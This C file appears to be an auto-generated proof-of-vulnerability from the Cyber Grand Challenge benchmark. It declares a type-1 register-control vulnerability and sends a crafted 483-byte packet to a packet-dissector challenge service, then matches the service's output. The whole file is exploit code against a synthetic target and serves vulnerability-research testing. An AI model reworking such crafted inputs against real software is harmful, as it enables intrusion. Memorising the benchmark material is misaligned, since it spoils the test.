#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xe3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xcb\x01\x00\x00\xc3\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xc3\x01\x00\x00"
         "\xad\xa4\x5a\x6e\xe4\x4d\x72\x5e\x39\x84\x4b\x51\xcc\x04\x05\x0e"
         "\x82\x4c\x41\x74\x3b\x00\x00\x00\x98\x78\x01\x00\xef\x41\x00\x01"
         "\xa7\x98\x0a\x0d\x0e\x36\x72\xbc\x36\x6e\x15\xfb\x98\x19\xd5\x9c"
         "\x2a\x40\x6d\x01\x00\xc0\x4d\x67\x7d\x7f\x1a\x1c\xd0\x73\x27\x75"
         "\x1d\xe2\xaa\x64\xff\xcc\x79\x82\x6b\x54\x27\xa7\x04\x4e\x22\xaa"
         "\xd0\xa5\x12\x3c\x9d\x8f\x0c\x2f\xd1\x9a\x16\x63\xbf\xfd\xb5\xf8"
         "\x1d\x51\xe0\x04\x6e\x26\x3d\xc2\xdf\x32\xba\x02\x41\x8a\xef\x59"
         "\xc0\xf1\xdc\xaa\x9d\x58\x07\x28\xc5\x03\x99\x69\x49\x12\xdf\xdc"
         "\x91\x50\xd3\xfe\xde\x31\x97\xdc\xe6\xa4\x73\xed\xf3\x1c\xd2\x7a"
         "\x5a\x5b\xcf\xe0\xa8\x88\x40\x63\x6d\x1b\xbf\xa4\x6c\xcb\xdb\x20"
         "\x46\x80\xa3\x95\xdd\x94\xd8\x47\xc6\xb7\xe5\xd2\x8b\xeb\xe1\xfa"
         "\xa0\x8e\x84\x33\x05\xfb\x7f\xa4\x84\x58\x00\x65\x84\x3f\x05\x03"
         "\x91\x9b\x66\x1d\xf3\xa0\x21\xf5\x16\x3b\xc4\xb7\x51\xaf\xf9\xcc"
         "\x27\x18\xb5\x71\x17\x1c\xa6\xf1\xc4\x5c\x99\x15\x37\xd5\x50\x35"
         "\x41\x94\x03\xf6\x33\x63\x0f\x9a\xab\xd1\x49\xf0\x97\x7a\xfd\x7f"
         "\x4e\xce\x29\xfe\xc3\x9e\xf0\x8b\x13\xb4\x63\xd8\xa5\x8b\x6f\x67"
         "\x71\x49\x75\xbd\xfb\x46\x42\x0d\x58\x80\x9b\x84\x5b\x43\x05\x0e"
         "\x53\x2d\x5b\x0f\x4e\x7c\xe4\x6b\x33\x2b\x81\xc1\xcb\x60\x98\x9a"
         "\xad\x36\xa3\xd2\xdc\xe1\x28\x17\xd2\x28\x2c\xf7\xb9\x5a\x05\xab"
         "\x14\x5f\x1e\x12\x5f\x1a\x5d\x1d\xfd\xf0\x9a\x4a\xbd\x58\x39\x92"
         "\x4b\xea\x9d\x50\xe6\xf3\xc5\xcd\x07\x21\x90\x4e\x27\xb2\x0c\x5d"
         "\x7c\xae\xce\xff\x54\xec\x67\x28\xe7\xb7\x82\xe1\xc2\x01\xa9\x81"
         "\x5e\x88\x24\x4d\x06\x07\x49\xdb\x5f\x51\xb0\xff\x2d\xb2\xaf\x79"
         "\x2b\x4a\x0e\x24\x05\x74\x85\x85\x92\x01\x00\x6e\x6c\x29\xcc\x63"
         "\x93\x61\x01\xcf\x01\xf6\x0f\xcb\xc8\xcd\xcc\x50\xeb\x25\x25\x36"
         "\xc2\x58\x56\xb4\x26\xf1\xd5\x22\x81\x1c\x01\x00\xdf\x41\x00\x16"
         "\xb3\xca\x17\xa3\xad\x88\x5b\x6e\xe2\xef\x60\x12\xcc\x46\x6c\x0f"
         "\x2f\x50\x3e\x8e\xde\x51\x71\x67\xa1\x65\x39\xcf\x02\x9e\x80\xd5"
         "\x88\xae\x9c";
      static unsigned int write_00001_00000_len = 483;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaintracutaneous
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x69\x6e\x74\x72\x61\x63"
         "\x75\x74\x61\x6e\x65\x6f\x75\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
